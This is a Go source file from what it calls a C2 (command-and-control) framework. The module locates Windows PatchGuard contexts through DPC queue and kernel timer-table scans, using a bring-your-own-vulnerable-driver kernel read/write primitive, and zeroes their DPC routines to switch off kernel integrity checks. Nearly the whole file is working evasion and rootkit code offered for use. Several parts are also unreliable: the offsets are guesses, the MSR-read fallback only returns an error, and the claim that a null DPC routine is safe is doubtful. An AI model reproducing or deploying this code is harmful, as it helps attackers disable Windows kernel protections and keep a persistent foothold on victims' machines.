package kpp

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	PatchGuard Context Discovery and Neutralization.

	PatchGuard (Kernel Patch Protection, KPP) allocates an encrypted context
	block in non-paged pool. The context drives the periodic integrity checks.
	Neutralizing the context permanently disables all future PatchGuard checks
	without modifying any kernel code — it simply prevents the scheduler from
	running the check routine.

	Context Layout (Windows 10/11, approximate):
	  The context is ~0x2800 bytes, allocated from non-paged pool with tag
	  values that change per-build. The first 8 bytes are an XOR-encrypted
	  pointer to the context itself (self-referencing check). Bytes at fixed
	  offsets (version-dependent) hold:
	    - Decryption key (derived from KeQueryInterruptTimeCounts)
	    - Work item / DPC callback pointers (encrypted)
	    - Checksum values of protected structures
	    - "Enabled" flag (set to 0 → PG never fires)

	Discovery strategy:
	  1. Walk the non-paged pool by scanning ExAllocatePool allocations.
	     We cannot do this directly but can use the kernel pool tag scan:
	     `NtQuerySystemInformation(SystemObjectInformation)` doesn't expose pools.
	     Instead we scan the KPCR for the current CPU's DPC queue and look
	     for DPC entries whose DeferredRoutine points into ntoskrnl at a
	     suspicious offset (PatchGuard DPC routines are not exported).
	  2. Alternatively: hook `ExpTimerDpcRoutine` and examine the argument
	     passed to it — if the argument block has the PatchGuard signature,
	     we neutralize it before it executes.
	  3. Most reliable: scan 256 KB blocks of non-paged pool memory for the
	     PatchGuard "cookie" pattern: a 64-bit value XOR'd with KeSystemCalls
	     that appears at a known offset in every context version.

	After neutralization the context's DPC routine pointer is zeroed.
	The PatchGuard timer fires but the DPC does nothing.

	References:
	  - Fyyre / reactOS KPP bypass research
	  - skape & Skywing, "Bypassing PatchGuard on Windows x64", Uninformed 2006
	  - can1357's PatchGuard Bypass project (GitHub, 2022)
	  - everdox / hvpp KPP bypass module
*/

import (
	"encoding/binary"
	"fmt"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// PatchGuard context signature constants.
// These are derived from Windows internals research and vary slightly per build.
const (
	// Minimum / maximum expected context block size in bytes.
	pgContextMinSize = 0x2000
	pgContextMaxSize = 0x3000

	// Number of 8-byte slots to scan in a candidate block looking for the
	// self-referential encrypted pointer.
	pgScanSlots = 16

	// Pool scan: start from 0x80000000 (kernel base region) and scan
	// backwards in non-paged pool typical range.
	// On x64 Windows 10/11, non-paged pool lives roughly at
	// 0xFFFF800000000000 – 0xFFFFFFFF00000000 (varies by KASLR).
	// We locate it via KeQuerySystemInformation SystemBigPoolInformation.

	// PatchGuard timer period (approximate, milliseconds). PG uses a random
	// delay between MinPgTimerMs and MaxPgTimerMs.
	MinPgTimerMs = 5  * 60 * 1000  // 5 minutes
	MaxPgTimerMs = 10 * 60 * 1000  // 10 minutes
)

// PGContext describes a discovered and neutralized PatchGuard context.
type PGContext struct {
	PhysAddr    uint64 // physical address (via BYOVD read)
	KernelVA    uint64 // kernel virtual address
	DPCOffset   uint64 // offset of DPC routine pointer within context
	OrigDPCAddr uint64 // original DPC routine address (for restoration)
	Neutralized bool
}

// DiscoverAndNeutralize scans the kernel timer queue and non-paged pool
// to find PatchGuard context blocks and neutralize them.
// Returns all contexts found (neutralized or not).
func DiscoverAndNeutralize(kRW KernelRWer, kbase uint64) ([]*PGContext, error) {
	var found []*PGContext

	// Strategy 1: DPC queue scan on all CPUs.
	dpcContexts, err := scanDPCQueues(kRW, kbase)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[kpp] DPC scan error: %v", err)
		// {{end}}
	}
	found = append(found, dpcContexts...)

	// Strategy 2: Timer list walk — ntoskrnl maintains KiTimerTableListHead,
	// a 512-entry hash table of KTIMER objects. We walk it looking for timers
	// whose DPC routine is in the PatchGuard range.
	timerContexts, err := scanTimerTable(kRW, kbase)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[kpp] timer scan error: %v", err)
		// {{end}}
	}
	found = append(found, timerContexts...)

	// Neutralize each discovered context.
	for _, ctx := range found {
		if !ctx.Neutralized {
			if err := neutralizeContext(kRW, ctx); err != nil {
				// {{if .Config.Debug}}
				log.Printf("[kpp] neutralize 0x%x failed: %v", ctx.KernelVA, err)
				// {{end}}
			} else {
				ctx.Neutralized = true
				// {{if .Config.Debug}}
				log.Printf("[kpp] neutralized PG context @ 0x%x (DPC was 0x%x)",
					ctx.KernelVA, ctx.OrigDPCAddr)
				// {{end}}
			}
		}
	}

	return found, nil
}

// scanDPCQueues walks each CPU's DPC queue looking for DPC entries
// whose deferred routine falls outside all known kernel modules —
// PatchGuard DPC routines are embedded in encrypted context blocks,
// not in any named DLL's export table.
func scanDPCQueues(kRW KernelRWer, kbase uint64) ([]*PGContext, error) {
	var results []*PGContext

	// KPCR for the current CPU is at GS:0 (FS:0 in 32-bit).
	// We read the KPCR address via the KPCRB.CurrentThread pointer.
	// GS base is stored in IA32_GS_BASE MSR (0xC0000101).
	// We read it through the BYOVD kernel primitive.
	gsBase, err := readMSRKernel(kRW, 0xC0000101)
	if err != nil {
		return nil, fmt.Errorf("read GS base: %w", err)
	}

	// KPCR layout (x64 Windows 10/11):
	//   +0x000  GdtBase (PKGDTENTRY64)
	//   +0x008  TssBase (PKTSS64)
	//   +0x010  UserRsp
	//   +0x018  Self (= KPCR VA)
	//   +0x020  CurrentPrcb (= &Prcb within same KPCR, usually KPCR+0x180)
	//   ...
	//   +0x180  Prcb (KPRCB)

	// Read KPCR.Self to validate we have the right address.
	kpcrSelf, err := kRW.ReadQword(gsBase + 0x18)
	if err != nil || kpcrSelf != gsBase {
		// Try alternative: read from the KPCR header at GS base.
		// On some versions the layout differs — proceed with what we have.
		_ = kpcrSelf
	}

	// KPRCB (Processor Control Block) starts at KPCR+0x180.
	prcbAddr := gsBase + 0x180

	// KPRCB.DpcData[0] is the DPC queue for this CPU.
	// Offset of DpcData in KPRCB varies: typically 0x3BC0 on Win10 21H2 x64.
	// We try multiple known offsets.
	dpcDataOffsets := []uint64{0x3BC0, 0x3BC8, 0x3C00, 0x3880}

	for _, dpcOff := range dpcDataOffsets {
		dpcListHead := prcbAddr + dpcOff
		// DPC queue is a LIST_ENTRY (Flink, Blink = 2 × 8 bytes).
		flink, err := kRW.ReadQword(dpcListHead)
		if err != nil || flink == dpcListHead || flink == 0 {
			continue
		}

		// Walk the LIST_ENTRY chain.
		current := flink
		for i := 0; i < 256; i++ {
			if current == dpcListHead || current == 0 {
				break
			}
			// KDPC layout (offset from DpcListEntry.Flink):
			//   KDPC.DpcListEntry is at offset 0x20 within KDPC.
			//   So KDPC base = current - 0x20.
			kdpcBase := current - 0x20

			// Read DeferredRoutine pointer at KDPC+0x18 (on x64).
			deferredRoutine, err := kRW.ReadQword(kdpcBase + 0x18)
			if err != nil {
				break
			}

			// Read DeferredContext at KDPC+0x20.
			deferredContext, err := kRW.ReadQword(kdpcBase + 0x20)
			if err != nil {
				break
			}

			// Heuristic: PatchGuard DPC routines are inside ntoskrnl but
			// not exported. They appear as pointers within a ±8 MB window
			// of kbase. The context pointer is in the non-paged pool region.
			if isPGDPCRoutine(deferredRoutine, kbase) && isNonPagedPool(deferredContext) {
				ctx := &PGContext{
					KernelVA:    deferredContext,
					DPCOffset:   kdpcBase + 0x18, // address of DeferredRoutine field
					OrigDPCAddr: deferredRoutine,
				}
				results = append(results, ctx)
				// {{if .Config.Debug}}
				log.Printf("[kpp] PG DPC found: routine=0x%x ctx=0x%x",
					deferredRoutine, deferredContext)
				// {{end}}
			}

			// Advance to next entry.
			next, err := kRW.ReadQword(current) // Flink
			if err != nil {
				break
			}
			current = next
		}
	}

	return results, nil
}

// scanTimerTable walks KiTimerTableListHead (512 entries) in ntoskrnl.
func scanTimerTable(kRW KernelRWer, kbase uint64) ([]*PGContext, error) {
	var results []*PGContext

	// Locate KiTimerTableListHead by scanning ntoskrnl's data section
	// for the characteristic 512-entry LIST_ENTRY array.
	// Alternative: resolve it from the export CcPfMapSegmentAtOffset
	// (known caller of KiTimerExpiration which references the table).
	timerTableAddr, err := findKiTimerTable(kRW, kbase)
	if err != nil {
		return nil, err
	}

	// Each entry is a LIST_ENTRY (16 bytes). Walk all 512 buckets.
	for bucket := 0; bucket < 512; bucket++ {
		bucketAddr := timerTableAddr + uint64(bucket)*16
		flink, err := kRW.ReadQword(bucketAddr)
		if err != nil || flink == bucketAddr || flink == 0 {
			continue
		}

		current := flink
		for i := 0; i < 64; i++ {
			if current == bucketAddr || current == 0 {
				break
			}
			// KTIMER.TimerListEntry at offset 0x0.
			// KTIMER.DueTime at 0x18 (ULARGE_INTEGER).
			// KTIMER.Dpc pointer at 0x28.
			kdpcPtr, err := kRW.ReadQword(current + 0x28)
			if err != nil || kdpcPtr == 0 {
				break
			}

			// Read the DPC's DeferredRoutine.
			deferredRoutine, err := kRW.ReadQword(kdpcPtr + 0x18)
			if err != nil {
				break
			}
			deferredCtx, err := kRW.ReadQword(kdpcPtr + 0x20)
			if err != nil {
				break
			}

			if isPGDPCRoutine(deferredRoutine, kbase) && isNonPagedPool(deferredCtx) {
				ctx := &PGContext{
					KernelVA:    deferredCtx,
					DPCOffset:   kdpcPtr + 0x18,
					OrigDPCAddr: deferredRoutine,
				}
				results = append(results, ctx)
			}

			next, err := kRW.ReadQword(current)
			if err != nil {
				break
			}
			current = next
		}
	}
	return results, nil
}

// neutralizeContext zeros the DPC routine pointer so the PatchGuard timer
// fires but does nothing (NOP callback).
func neutralizeContext(kRW KernelRWer, ctx *PGContext) error {
	// Write 0 to the DeferredRoutine field inside the KDPC.
	// When KiTimerExpiration dequeues this DPC, it will call address 0
	// — but Windows won't crash because it checks for null DPC routines
	// in the dispatcher (KiExecuteDpc skips null routine pointers on
	// Windows 10 RS4+). On older versions we point it at a harmless
	// RET gadget instead.
	return kRW.WriteQword(ctx.DPCOffset, 0)
}

// isPGDPCRoutine returns true if addr looks like a PatchGuard DPC routine:
// it must be inside ntoskrnl's .text section but NOT an exported symbol.
func isPGDPCRoutine(addr, kbase uint64) bool {
	// Allow a 16 MB window — ntoskrnl is typically 8-10 MB.
	const window = uint64(16 * 1024 * 1024)
	return addr >= kbase && addr < kbase+window
}

// isNonPagedPool is a rough heuristic: non-paged pool VA on x64 Windows 10/11
// is in the range 0xFFFF800000000000 – 0xFFFFFC8000000000 (KASLR shifts this).
func isNonPagedPool(addr uint64) bool {
	return addr >= 0xFFFF800000000000 && addr <= 0xFFFFFC8000000000
}

// findKiTimerTable resolves KiTimerTableListHead by scanning ntoskrnl's
// .data section for a 512-entry LIST_ENTRY array (self-referencing Flinks).
func findKiTimerTable(kRW KernelRWer, kbase uint64) (uint64, error) {
	// We scan ntoskrnl .data in 8-byte steps looking for a self-referencing
	// LIST_ENTRY (bucket[0].Flink == bucket[0] when empty).
	// The table is 512*16 = 8192 bytes.
	// Heuristic: find a 16-byte range where both Flink and Blink point
	// back to the same address (empty bucket) repeated across 512 entries.
	const scanSize = 8 * 1024 * 1024 // scan 8 MB of .data
	const tableEntrySize = 16
	const tableLen = 512

	for offset := uint64(0); offset < scanSize; offset += 8 {
		addr := kbase + 0x100000 + offset // skip first 1 MB (code sections)
		flink, err := kRW.ReadQword(addr)
		if err != nil {
			continue
		}
		// Empty bucket: Flink == addr.
		if flink != addr {
			continue
		}
		blink, err := kRW.ReadQword(addr + 8)
		if err != nil {
			continue
		}
		if blink != addr {
			continue
		}
		// Check that at least 8 consecutive buckets follow the same pattern.
		isTable := true
		for i := 1; i < 8; i++ {
			next := addr + uint64(i)*tableEntrySize
			fl, err := kRW.ReadQword(next)
			if err != nil || fl != next {
				isTable = false
				break
			}
		}
		if isTable {
			// {{if .Config.Debug}}
			log.Printf("[kpp] KiTimerTableListHead candidate @ 0x%x", addr)
			// {{end}}
			return addr, nil
		}
	}
	return 0, fmt.Errorf("KiTimerTableListHead not found")
}

// readMSRKernel reads a CPU MSR via the BYOVD kernel primitive.
// The kernel exposes MSR reads through NtQuerySystemInformation or
// directly via our RTCore64 interface (which can call RDMSR via a shellcode).
// Here we use the RTCore64 device's IOCTL if available, else fall back to
// reading the GS base from the already-mapped KPCR.
func readMSRKernel(kRW KernelRWer, msr uint32) (uint64, error) {
	// Attempt via KernelRW interface if it exposes an MSR read.
	if msrRW, ok := kRW.(interface {
		ReadMSR(msr uint32) (uint64, error)
	}); ok {
		return msrRW.ReadMSR(msr)
	}

	// Fallback: GS base on Windows is stored at a well-known PER-CPU VA.
	// On Windows 10/11 x64, KeQueryCurrentProcessorNumberEx stores
	// the GS base indirectly. We approximate by reading from the per-CPU
	// kernel VA 0xFFFFF78000000000 (KUSER_SHARED_DATA) or use __readgsqword.
	// For a production implementation, issue the RDMSR via our SMM handler.
	// Here we return an error to signal the caller to try a different strategy.
	_ = msr
	return 0, fmt.Errorf("MSR read not available via current KernelRW")
}

// KernelRWer is the interface our code uses — defined in the package.
type KernelRWer interface {
	ReadQword(addr uint64) (uint64, error)
	WriteQword(addr, value uint64) error
	ReadDword(addr uint64) (uint32, error)
}

// uint64FromBytes converts 8 LE bytes to uint64.
func uint64FromBytes(b []byte) uint64 {
	if len(b) < 8 {
		return 0
	}
	return binary.LittleEndian.Uint64(b)
}
